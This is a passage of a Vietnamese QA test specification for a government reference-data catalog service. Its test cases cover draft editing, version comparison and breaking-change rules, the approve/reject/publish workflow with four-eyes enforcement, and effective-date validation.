- **Loại** Dương · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-012 · API-07-028
- **Tiền điều kiện / dữ liệu** v2 đã phát hành với `KH02.L03.P01` DEPRECATED; tạo bản nháp v3.
- **Bước**
  1. Gọi `PATCH .../versions/draft/items/KH02.L03.P01` thân `{"status":"ACTIVE","replacedBy":[]}`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** `200`; bản ghi ACTIVE trong v3; diff ghi `CHANGED` (trạng thái), không phá vỡ.

> **Câu hỏi mở Q07-79:** Khung chung không nói rõ có cho khôi phục bản ghi đã ngừng dùng hay không. TC-07-057 giả định cho phép trong bản nháp mới (vì không vi phạm BR-07-003), cần FRS xác nhận.

#### TC-07-058 · Không xóa bản ghi đã từng phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012 · BR-07-003 · API-07-030 · ERR-07-013 · AT-07-004 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Bản nháp v2; `KH01` đã phát hành ở v1.
- **Bước**
  1. Gọi `DELETE .../versions/draft/items/KH01`.
- **Mong đợi** `409`, `ERR-07-013`, chi tiết gợi ý dùng ngừng dùng. Bản ghi giữ nguyên.

#### TC-07-059 · Xóa bản ghi mới thêm trong bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-012 · API-07-030
- **Tiền điều kiện / dữ liệu** `KH01.L01.P10` vừa thêm ở TC-07-050 (chưa từng phát hành).
- **Bước**
  1. Gọi `DELETE .../versions/draft/items/KH01.L01.P10`.
- **Mong đợi** `204`; bản ghi bị xóa vật lý khỏi bản nháp; diff không còn mục `ADDED` tương ứng. KT: có.

#### TC-07-060 · Sửa bản ghi bằng If-Match
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012 · API-07-028 · UI-07-05 · LGC-DMDC-011
- **Tiền điều kiện / dữ liệu** Bản nháp v2; bản ghi `KH01.L02` có `ETag` `"3"`.
- **Bước**
  1. Gọi `PATCH .../items/KH01.L02` với `If-Match: "3"`, thân `{"name":"Loại 2 (sửa)","attrs":{"viet_tat":"L2S"}}`.
  2. Trên UI-07-05, sửa trực tiếp ô tên trong bảng và nhấn Enter.
- **Mong đợi** `200`, `ETag` mới; chỉ khóa `viet_tat` trong `attrs` thay đổi (cập nhật kiểu hợp nhất JSON Merge Patch), các khóa khác giữ nguyên.

#### TC-07-061 · Kiểm tra hợp lệ toàn bản nháp không có lỗi
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-013 · API-07-016
- **Tiền điều kiện / dữ liệu** Bản nháp v2 hợp lệ.
- **Bước**
  1. Gọi `POST .../versions/draft:validate`.
- **Mong đợi** `200`, `{"valid":true,"errorCount":0,"stats":{...}}` với `stats` gồm số thêm, sửa, ngừng dùng, phá vỡ.

#### TC-07-062 · Kiểm tra hợp lệ toàn bản nháp phát hiện lỗi tích lũy
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API, IT
- **Truy vết** FR-07-013 · BR-07-014 · API-07-016
- **Tiền điều kiện / dữ liệu** Chèn trực tiếp vào CSDL (bằng vai trò kiểm thử) hai bản ghi vi phạm mà API đơn lẻ không bắt được do đổi lược đồ sau: một bản ghi `cap_quan_ly` ngoài miền mới, một bản ghi ACTIVE có cha DEPRECATED.
- **Bước**
  1. Gọi `POST .../versions/draft:validate`.
  2. Gọi `POST .../versions/draft:submit`.
- **Mong đợi** Bước 1 trả `200` với `valid = false`, `errors` liệt kê đủ 2 lỗi theo mã bản ghi. Bước 2 trả `422` `ERR-07-009` (không trình được bản nháp không hợp lệ).

#### TC-07-063 · Hiển thị bản ghi dạng bảng và dạng cây
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** FR-07-018 · UI-07-02, 05 · API-07-026, 044 · LGC-DMDC-002
- **Tiền điều kiện / dữ liệu** CAT-LH v1; người dùng U-T68-VW.
- **Bước**
  1. Mở UI-07-02 tab Bản ghi, chế độ Bảng; đổi trang, sắp xếp theo tên, tìm "phan loai".
  2. Chuyển chế độ Cây; mở rộng `KH01`, `KH01.L01`.
  3. Dùng bàn phím mũi tên phải, trái để mở, thu nút cây.
- **Mong đợi** Bảng phân trang phía máy chủ 20 dòng mặc định (FR-00-021), sắp xếp đúng, tìm không dấu đúng. Cây tải theo nhánh khi mở (không tải toàn bộ), hiển thị tên cấp, số con. Điều hướng bàn phím theo mẫu WAI-ARIA tree.

#### TC-07-064 · Hủy bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-017 · API-07-015 · EN-07-07
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có thay đổi.
- **Bước**
  1. Gọi `DELETE /catalogs/LOAI_HINH_TC/versions/draft` với `If-Match`, thân `{"reason":"Làm lại"}`.
  2. Gọi `POST /catalogs/LOAI_HINH_TC/versions`.
- **Mong đợi** Bước 1 trả `204`; phiên bản chuyển `DISCARDED`, có dòng `version_review` hành động `DISCARD`. Bước 2 trả `201` với `version_no = 3` (không tái sử dụng số 2). KT: có.

#### TC-07-065 · Không hủy phiên bản đang duyệt, đã duyệt hoặc đã phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-017 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Ba phiên bản ở `IN_REVIEW`, `APPROVED`, `PUBLISHED` (trên ba danh mục thử).
- **Bước**
  1. Gọi `DELETE /catalogs/{c}/versions/{v}` cho từng phiên bản.
- **Mong đợi** Cả ba trả `409` `ERR-07-004`.

#### TC-07-066 · Thay đổi trên bản nháp không ảnh hưởng tra cứu phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-011 · BR-07-006 · ADR-051
- **Tiền điều kiện / dữ liệu** Bản nháp v2 đã đổi tên `KH01` và ngừng dùng `KH02.L03.P01`.
- **Bước**
  1. APP-T68-READ gọi `GET /catalogs/LOAI_HINH_TC/items/KH01` và `.../KH02.L03.P01`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/items` với `If-None-Match` bằng ETag lấy trước khi sửa nháp.
- **Mong đợi** Bước 1 trả dữ liệu của v1 (tên cũ, ACTIVE). Bước 2 trả `304`.

### TS-07-06 · So sánh phiên bản và phân loại thay đổi phá vỡ

**Mục tiêu.** Xác nhận báo cáo khác biệt giữa hai phiên bản liệt kê đúng bản ghi thêm, sửa, ngừng dùng, thay đổi thuộc tính và phân loại đúng phá vỡ hay không phá vỡ theo khung §3.18. Kết quả phân loại là đầu vào của quy tắc duyệt BR-07-012 và của đồng bộ BR-07-017 nên sai ở đây gây sai dây chuyền.

**Phủ.** FR-07-014; BR-07-012, 013; API-07-021; UI-07-07; ERR-07-006.

**Tiền điều kiện chung.** CAT-LH v1 PUBLISHED; bản nháp v2 có: 2 bản ghi thêm, 3 bản ghi đổi tên, 1 bản ghi đổi thuộc tính, 1 bản ghi đổi mã cha, 1 bản ghi ngừng dùng, 1 thuộc tính mới không bắt buộc. Người gọi U-T68-DA1.

#### TC-07-067 · So sánh bản nháp với phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-014 · API-07-021 · AT-07-009 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/versions/draft/diff?against=current`.
  2. Gọi lại với `?against=current&changeType=CHANGED&page=0&size=50`.
- **Mong đợi** `200`; `summary` = `{added:2, changed:4, deprecated:1, parentChanged:1, attributeAdded:1, breaking:2}` (đổi mã cha và ngừng dùng là phá vỡ). Mỗi mục có `itemCode`, `changeType`, `breaking`, `before`, `after` chỉ gồm trường thay đổi. Bước 2 lọc đúng.

#### TC-07-068 · Bộ phân loại thay đổi phá vỡ theo bảng quyết định
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** UT
- **Truy vết** FR-07-014 · BR-07-013 · khung §3.18
- **Tiền điều kiện / dữ liệu** Bảng quyết định dưới đây là dữ liệu tham số hóa (`@ParameterizedTest`).
- **Bước**
  1. Với mỗi dòng của bảng, dựng cặp phiên bản trước và sau tối thiểu rồi gọi bộ phân loại.
- **Mong đợi** Kết quả khớp bảng sau.

| Thay đổi | Phá vỡ |
|---|---|
| Thêm bản ghi | Không |
| Sửa tên bản ghi | Không |
| Sửa giá trị thuộc tính | Không |
| Thêm thuộc tính không bắt buộc | Không |
| Thêm thuộc tính bắt buộc có mặc định | Không |
| Ẩn thuộc tính, đổi nhãn, đổi thứ tự | Không |
| Ngừng dùng bản ghi | Có |
| Xóa bản ghi (chỉ có thể với bản ghi chưa phát hành, không xuất hiện trong diff với phiên bản đã phát hành) | Không áp dụng |
| Đổi mã cha | Có |
| Xóa thuộc tính | Có |
| Đổi kiểu thuộc tính | Có |
| Giảm `maxLength`, thu hẹp `enumValues`, tăng `minValue`, giảm `maxValue`, thêm `pattern` | Có |
| Nới `maxLength`, thêm giá trị vào `enumValues` | Không |
| Bật `required` cho thuộc tính đã có | Có |

#### TC-07-069 · So sánh với phiên bản không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-014 · ERR-07-006
- **Tiền điều kiện / dữ liệu** CAT-LH chỉ có v1, v2.
- **Bước**
  1. Gọi `GET .../versions/draft/diff?against=9`.
  2. Gọi `GET .../versions/9/diff?against=1`.
- **Mong đợi** Cả hai trả `404` `ERR-07-006`.

#### TC-07-070 · So sánh hai phiên bản đã phát hành không liền kề
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-014 · API-07-021
- **Tiền điều kiện / dữ liệu** `DVHC` có v1, v2, v3 (mục 2.4); người gọi U-PA.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/versions/3/diff?against=1`.
- **Mong đợi** `200`; kết quả là khác biệt trực tiếp giữa v1 và v3 (không phải cộng dồn từng bước): `99001`, `99002`, `99003`, `99005` và các huyện ở trạng thái ngừng dùng hoặc vắng mặt theo cách hệ thống quy ước; `99101`, `99102`, `99201` là thêm; `99004` là đổi tên.

#### TC-07-071 · Màn so sánh phiên bản trên giao diện
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-07-014 · UI-07-07
- **Tiền điều kiện / dữ liệu** Như chung; người dùng U-T68-DA1.
- **Bước**
  1. Mở UI-07-07 cho bản nháp v2; xem thẻ tổng hợp và bảng khác biệt.
  2. Bật bộ lọc "Chỉ thay đổi phá vỡ".
- **Mong đợi** Thẻ tổng hợp hiển thị đúng số liệu như TC-07-067; dòng phá vỡ có nhãn cảnh báo (không chỉ dùng màu, có biểu tượng và chữ); bộ lọc còn 2 dòng.

### TS-07-07 · Trình duyệt, duyệt, từ chối và phát hành phiên bản

**Mục tiêu.** Xác nhận máy trạng thái phiên bản (khung §3.5) với mọi chuyển hợp lệ và các chuyển không hợp lệ quan trọng; nguyên tắc bốn mắt theo D02-08 (người có `PERM-07-publish` không duyệt hoặc phát hành phiên bản do chính mình trình hoặc sửa lần cuối); ngưỡng thay đổi lớn; ràng buộc ngày hiệu lực; tác dụng phụ khi phát hành (đóng hiệu lực phiên bản trước, sinh ảnh chụp, đổi con trỏ, phát sự kiện).

**Phủ.** FR-07-015, 016; BR-07-005, 006, 007, 008, 011, 012, 026, 027; UC-07-06, 07; API-07-014, 017…020; UI-07-07; ERR-07-004, 015, 016, 017; EVT-07-04, 05, 06; FR-00-070…072.

**Tiền điều kiện chung.** CAT-LH `require_approval = true`; CAT-MUC `require_approval = false`; ngưỡng thay đổi lớn mặc định 10%; người soạn U-T68-DS-NV; người duyệt U-T68-DA1.

#### TC-07-072 · Trình duyệt bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015 · API-07-017 · UC-07-06 · EVT-07-04 · FR-00-070
- **Tiền điều kiện / dữ liệu** Bản nháp v2 của CAT-LH hợp lệ, `effectiveFrom` = 2026-12-01, có `legalBasis`.
- **Bước**
  1. U-T68-DS-NV gọi `POST /catalogs/LOAI_HINH_TC/versions/draft:submit` thân `{"comment":"Đề nghị duyệt"}`.
  2. Đọc topic `t68.rdm.catalog.submitted.v1`.
  3. U-T68-DA1 mở hộp "Việc của tôi".
- **Mong đợi** `200`; `status = IN_REVIEW`, `submittedBy` = U-T68-DS-NV; `version_review` có dòng `SUBMIT` kèm `diffStats`. EVT-07-04 phát đúng một lần (có `catalogCode`, `versionNo`, `submittedBy`, `diffStats`, đường dẫn tới UI-07-07). Hộp "Việc của tôi" của U-T68-DA1 có việc chờ duyệt. KT: có (SUBMIT).

#### TC-07-073 · Duyệt phiên bản bởi người khác người trình
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015 · BR-07-011 · API-07-018 · UI-07-07
- **Tiền điều kiện / dữ liệu** v2 `IN_REVIEW` do U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/2:approve` thân `{"comment":"Đồng ý"}`.
- **Mong đợi** `200`; `status = APPROVED`, `approvedBy` = U-T68-DA1; `version_review` có `APPROVE`. Không phát EVT-07-05. KT: có (APPROVE).

#### TC-07-074 · Phát hành phiên bản đã duyệt
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-006, 007 · API-07-020 · UC-07-07 · EVT-07-05 · ADR-053
- **Tiền điều kiện / dữ liệu** v2 `APPROVED`, `effectiveFrom` = 2026-12-01; v1 hiệu lực từ 2025-01-01 không có `effective_to`.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/2:publish`.
  2. Kiểm tra CSDL: `catalog_version` v1, v2; `catalog.current_version_id`.
  3. Kiểm tra kho đối tượng `s3://dh-t68-rdm/snapshots/LOAI_HINH_TC/2.json.gz` và `.csv`.
  4. Đọc topic `t68.rdm.catalog.published.v1`.
- **Mong đợi** `200`; v2 `PUBLISHED`, `publishedBy`, `publishedAt`, `snapshotUri`, `schemaHash` có giá trị; v1 `effective_to` = 2026-12-01 (BR-07-007). `current_version_id` trỏ v2 (con trỏ "phiên bản mới nhất đã phát hành"; phiên bản hiệu lực tại một thời điểm vẫn tính theo khoảng ngày). Ảnh chụp có số bản ghi bằng `item_count`, giải nén ra JSON hợp lệ, SHA-256 ghi trong metadata đối tượng. EVT-07-05 phát đúng một lần với `catalogCode`, `versionNo` = 2, `effectiveFrom`, `stats`, `breaking`, `snapshotUri`. KT: có (PUBLISH).

#### TC-07-075 · Phát hành lần đầu chuyển danh mục sang ACTIVE
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · khung §3.6 · API-07-020
- **Tiền điều kiện / dữ liệu** Danh mục `TC005_CAP_DO` DRAFT, v1 đã qua submit, approve.
- **Bước**
  1. U-T68-DA1 gọi `POST /catalogs/TC005_CAP_DO/versions/1:publish`.
  2. Gọi `GET /catalogs/TC005_CAP_DO`.
- **Mong đợi** `status` danh mục chuyển `DRAFT` → `ACTIVE`; v1 `PUBLISHED`. Danh mục xuất hiện trong `GET /catalogs?status=ACTIVE` và tra cứu được qua API khai thác.

#### TC-07-076 · Từ chối phiên bản, bắt buộc lý do
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015 · API-07-019 · EVT-07-06 · FR-00-072
- **Tiền điều kiện / dữ liệu** Phiên bản `IN_REVIEW` do U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA1 gọi `POST .../versions/{v}:reject` thân `{}`.
  2. U-T68-DA1 gọi lại với `{"comment":"Thiếu căn cứ pháp lý"}`.
  3. U-T68-DS-NV sửa bản ghi trên phiên bản đó.
- **Mong đợi** Bước 1 trả `422` lỗi kiểm tra hợp lệ (trường `comment` bắt buộc). Bước 2 trả `200`, `status = DRAFT`; `version_review` lưu `REJECT` cùng lý do; EVT-07-06 phát một lần (người nhận là người trình). Bước 3 thành công vì phiên bản đã về `DRAFT`. KT: có (REJECT).

#### TC-07-077 · Người trình không được tự duyệt
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015 · BR-07-011 · ERR-07-015 · FR-00-071 · D02-08
- **Tiền điều kiện / dữ liệu** U-T68-DA2 (có cả DATA_STEWARD và DATA_APPROVER) soạn và trình bản nháp v2.
- **Bước**
  1. U-T68-DA2 gọi `POST .../versions/2:approve`.
  2. U-T68-DA2 gọi `POST .../versions/2:reject` (người trình không được tự từ chối; muốn đưa bản nháp về thì dùng `action = WITHDRAW` trên API-07-017, xem TC-07-256).
- **Mong đợi** Bước 1 trả `403`, `ERR-07-015`; phiên bản giữ `IN_REVIEW`. Bước 2 trả `403` `ERR-07-015`. KT: nhật ký an ninh ghi nhận lần thử tự duyệt.

#### TC-07-078 · Người sửa lần cuối không được duyệt hoặc phát hành
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015, 016 · BR-07-011 · ERR-07-015 · khung §14.3
- **Tiền điều kiện / dữ liệu** U-T68-DA2 sửa một bản ghi trong bản nháp v2; sau đó U-T68-DS-NV trình.
- **Bước**
  1. U-T68-DA2 gọi `:approve`.
  2. U-T68-DA1 gọi `:approve` (hợp lệ), sau đó U-T68-DA2 gọi `:publish`.
  3. Với CAT-MUC (`require_approval = false`), U-T68-DA2 sửa bản nháp rồi tự gọi `:publish`.
- **Mong đợi** Bước 1 trả `403` `ERR-07-015`. Bước 2: duyệt thành công; `:publish` của U-T68-DA2 trả `403` `ERR-07-015`. Bước 3 trả `403` `ERR-07-015`.

#### TC-07-079 · Không sửa bản ghi của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-006 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 PUBLISHED.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions/1/items`.
  2. Gọi `PATCH .../versions/1/items/KH01`.
  3. Gọi `POST .../versions/1/items/KH01:deprecate`.
  4. Gọi `POST .../versions/1/items:batch`.
  5. (IT) Dùng vai trò ứng dụng `dh_data_app` chạy `UPDATE ph07_rdm.catalog_item SET name='x' WHERE version_id=<v1>`.
- **Mong đợi** Bước 1…4 trả `409` `ERR-07-004`. Bước 5 bị từ chối bởi ràng buộc ở CSDL (trigger hoặc chính sách chặn ghi vào phiên bản đã phát hành) nếu SDD chọn bảo vệ hai lớp; nếu SDD chỉ bảo vệ ở tầng ứng dụng thì bước 5 được ghi nhận là rủi ro chấp nhận (xem Q07-80). Băm nội dung v1 không đổi.

> **Câu hỏi mở Q07-80:** Tính bất biến của phiên bản đã phát hành có được bảo vệ ở tầng CSDL (trigger từ chối UPDATE/DELETE khi `status = PUBLISHED`) không? Ca TC-07-079 bước 5 cần câu trả lời từ SDD/CSDL.

#### TC-07-080 · Không sửa ngày hiệu lực, căn cứ của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-006 · API-07-014 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 PUBLISHED.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/1` đổi `effectiveFrom`, `legalBasis`.
- **Mong đợi** `409` `ERR-07-004`.

#### TC-07-081 · Không sửa bản ghi khi phiên bản đang duyệt hoặc đã duyệt
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012, 015 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Hai phiên bản ở `IN_REVIEW` và `APPROVED`.
- **Bước**
  1. Với mỗi phiên bản gọi `PATCH .../items/{code}`, `POST .../attributes`, `POST /import-jobs` (đích là phiên bản đó).
- **Mong đợi** Mọi lệnh trả `409` `ERR-07-004` (tác vụ nhập bị từ chối ngay khi tạo hoặc khi commit, tùy SDD; ca này kiểm tra không có dữ liệu nào bị ghi).

#### TC-07-082 · Không trình phiên bản đã hủy
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-015, 017 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Phiên bản số 2 `DISCARDED` (TC-07-064).
- **Bước**
  1. Gọi `POST .../versions/2:submit`.
- **Mong đợi** `409` `ERR-07-004`.

#### TC-07-083 · Không bỏ qua bước trình hoặc bước duyệt khi danh mục cần duyệt
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-015, 016 · BR-07-026 · ERR-07-004
- **Tiền điều kiện / dữ liệu** CAT-LH `require_approval = true`; bản nháp v2 `DRAFT` rồi `IN_REVIEW`.
- **Bước**
  1. Khi `DRAFT`, U-T68-DA1 gọi `:approve`.
  2. Khi `DRAFT`, U-T68-DA1 gọi `:publish`.
  3. Khi `IN_REVIEW`, U-T68-DA1 gọi `:publish`.
- **Mong đợi** Cả ba trả `409` `ERR-07-004`.

#### TC-07-084 · Phát hành trực tiếp từ bản nháp khi không cần duyệt
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-016 · BR-07-026 · API-07-020 · EVT-07-05
- **Tiền điều kiện / dữ liệu** CAT-MUC 4 bản ghi; bản nháp do U-T68-DS-NV soạn chỉ sửa mô tả một thuộc tính, không đổi bản ghi nào (0% thay đổi, không phá vỡ). Người phát hành U-T68-DA1.
- **Bước**
  1. U-T68-DA1 gọi `POST /catalogs/MUC_DO_DVC/versions/draft:publish` với `effectiveFrom` hôm nay.
  2. Trên UI-07-07, kiểm tra nút hiển thị khi người dùng có `PERM-07-publish`.
- **Mong đợi** `200`; phiên bản chuyển thẳng `DRAFT` → `PUBLISHED`; `version_review` có `PUBLISH` (không có `SUBMIT`, `APPROVE`). EVT-07-05 phát; không phát EVT-07-04. Giao diện hiện nút "Phát hành" (không chỉ "Trình duyệt").

#### TC-07-085 · Phát hành trực tiếp bị chặn khi thay đổi vượt ngưỡng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015, 016 · BR-07-012, 026 · ERR-07-016 · AT-07-010 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Danh mục `TC085_DM` 100 bản ghi, `require_approval = false`; bản nháp thêm 11 bản ghi (11%).
- **Bước**
  1. U-T68-DA1 gọi `:publish` trên bản nháp.
  2. Mở UI-07-07.
- **Mong đợi** `409` `ERR-07-016`, chi tiết có tỉ lệ 11% và ngưỡng 10%. Giao diện vô hiệu nút "Phát hành" kèm giải thích, chỉ còn "Trình duyệt".

#### TC-07-086 · Phát hành trực tiếp bị chặn khi có thay đổi phá vỡ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-012, 026 · ERR-07-016
- **Tiền điều kiện / dữ liệu** `TC085_DM` (`require_approval = false`), bản nháp chỉ ngừng dùng 1 bản ghi (1%, phá vỡ).
- **Bước**
  1. U-T68-DA1 gọi `:publish`.
  2. Trình duyệt bằng U-T68-DS-NV, U-T68-DA1 duyệt rồi phát hành.
- **Mong đợi** Bước 1 trả `409` `ERR-07-016`. Bước 2 thành công qua luồng duyệt.

#### TC-07-087 · Biên của ngưỡng thay đổi lớn
- **Loại** Biên · **Ưu tiên** P2 · **Tự động** API, UT
- **Truy vết** BR-07-012 · FR-07-053
- **Tiền điều kiện / dữ liệu** `TC085_DM` 100 bản ghi; ngưỡng 10%.
- **Bước**
  1. Bản nháp thêm đúng 10 bản ghi; gọi `:publish`.
  2. Bản nháp khác thêm 10 và sửa tên 1 (11 thay đổi); gọi `:publish`.
  3. Đổi tham số ngưỡng tenant `07.rdm.large-change-threshold-percent` = 20; lặp bước 2.
- **Mong đợi** Bước 1 trả `200` (bằng ngưỡng không phải vượt). Bước 2 trả `409` `ERR-07-016`. Bước 3 trả `200`. Cách tính tỉ lệ: số bản ghi thay đổi (thêm, sửa, ngừng dùng) chia số bản ghi của phiên bản hiện hành; danh mục chưa có phiên bản phát hành thì không áp ngưỡng.

> **Câu hỏi mở Q07-81:** Công thức tỉ lệ thay đổi (mẫu số là số bản ghi phiên bản hiện hành hay bản nháp; sửa thuộc tính có tính là thay đổi bản ghi) cần FRS chốt. TC-07-087 dùng công thức ghi trên.

#### TC-07-088 · Ngày hiệu lực không hợp lệ: thiếu, sớm hơn ngày phát hành, hồi tố có lý do
- **Loại** Âm, Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-027 · ERR-07-017
- **Tiền điều kiện / dữ liệu** Đồng hồ 2026-11-21; phiên bản `APPROVED` của `TC088_DM`; phiên bản `origin = SYNC` của `GIOI_TINH` chờ áp dụng.
- **Bước**
  1. Phát hành khi `effectiveFrom` rỗng.
  2. Phát hành với `effectiveFrom` = 2026-11-20 (`origin = MANUAL`).
  3. Phát hành phiên bản `origin = SYNC` với `effectiveFrom` = 2026-11-01 và `retroactiveReason` = "Quốc gia ban hành từ 01/11".
  4. Lặp bước 3 nhưng thiếu `retroactiveReason`.
- **Mong đợi** Bước 1, 2, 4 trả `422` `ERR-07-017`. Bước 3 trả `200`, lý do hồi tố lưu trong `change_note` hoặc trường riêng và trong kiểm toán.

#### TC-07-089 · Khoảng hiệu lực chồng lấn với phiên bản trước
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-016 · BR-07-007 · ERR-07-017 · AT-07-008 (SRS cũ)
- **Tiền điều kiện / dữ liệu** `TC089_DM` v1 hiệu lực từ 2026-12-15 (đã phát hành, sắp hiệu lực); v2 `APPROVED`.
- **Bước**
  1. Phát hành v2 với `effectiveFrom` = 2026-12-15.
  2. Phát hành v2 với `effectiveFrom` = 2026-12-10.
  3. Phát hành v2 với `effectiveFrom` = 2026-12-16.
- **Mong đợi** Bước 1, 2 trả `422` `ERR-07-017` (phải lớn hơn `effective_from` của phiên bản trước). Bước 3 trả `200`; v1 có `effective_to` = 2026-12-16. Ràng buộc loại trừ `daterange` trong CSDL (nếu có) không bị vi phạm.

#### TC-07-090 · Phiên bản sắp hiệu lực và tra cứu theo thời điểm
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016, 026 · BR-07-008 · ADR-051
- **Tiền điều kiện / dữ liệu** CAT-LH v2 phát hành ở TC-07-074 với `effectiveFrom` = 2026-12-01 (đổi tên `KH01`); đồng hồ 2026-11-21.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/versions` và xem nhãn.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH01`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH01?at=2026-12-01`.
  4. Đặt đồng hồ 2026-12-01T00:00:01+07:00 rồi gọi lại bước 2.
  5. Đặt đồng hồ 2026-11-30T23:59:59+07:00 (tương đương 2026-11-30T16:59:59Z) rồi gọi lại bước 2.
- **Mong đợi** Bước 1: v1 "Đang hiệu lực", v2 "Sắp hiệu lực". Bước 2 trả tên cũ (v1). Bước 3 trả tên mới. Bước 4 trả tên mới. Bước 5 trả tên cũ (ngày tính theo giờ Việt Nam, không theo UTC).

#### TC-07-091 · Quản trị tỉnh không được duyệt và phát hành
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-015, 016 · D02-08 §3.1 · khung §14.2
- **Tiền điều kiện / dữ liệu** Phiên bản `IN_REVIEW` và một phiên bản `APPROVED`; CAT-MUC có bản nháp; người gọi U-T68-TA.
- **Bước**
  1. Gọi `:approve` trên phiên bản `IN_REVIEW`.
  2. Gọi `:publish` trên phiên bản `APPROVED`.
  3. Gọi `:publish` trên bản nháp CAT-MUC (không cần duyệt).
  4. Mở UI-07-07 bằng U-T68-TA.
- **Mong đợi** Bước 1…3 trả 403-PQ; trạng thái không đổi. Giao diện không hiện nút "Duyệt", "Phát hành" cho U-T68-TA.

#### TC-07-092 · Cán bộ quản lý danh mục không tự phát hành dù danh mục không cần duyệt
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-016 · BR-07-026 · D02-08 §3.1
- **Tiền điều kiện / dữ liệu** CAT-MUC có bản nháp dưới ngưỡng; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs/MUC_DO_DVC/versions/draft:publish`.
- **Mong đợi** 403-PQ (DATA_STEWARD không có `PERM-07-publish` theo D02-08; khung §4 cũ cho phép, đã bị §14 ghi đè). Gợi ý trên giao diện: chỉ có nút "Trình duyệt".

### TS-07-08 · Tệp mẫu và nhập tệp theo chế độ

**Mục tiêu.** Xác nhận quy trình nhập tệp hai pha (ADR-056): pha 1 tải lên, quét, phân tích luồng, kiểm tra hợp lệ và trả xem trước; pha 2 ghi vào bản nháp trong một giao dịch. Kịch bản kiểm tra từng chế độ `UPSERT`, `REPLACE`, `APPEND` bằng bảng kết quả mong đợi theo dòng, nguyên tắc tất cả hoặc không (BR-07-015), tùy chọn bỏ qua dòng lỗi, hết hạn 24 giờ và kiểm tra bản nháp không bị sửa giữa chừng (BR-07-016). Đây là nhóm thay thế LGC-DMDC-006, 007 nên được nghiệm thu kỹ.

**Phủ.** FR-07-020, 021, 025; BR-07-015, 016; UC-07-03; API-07-032…037, 040; UI-07-06, 08; ERR-07-019, 020, 021; EVT-07-07; FR-00-032, 033, 054.

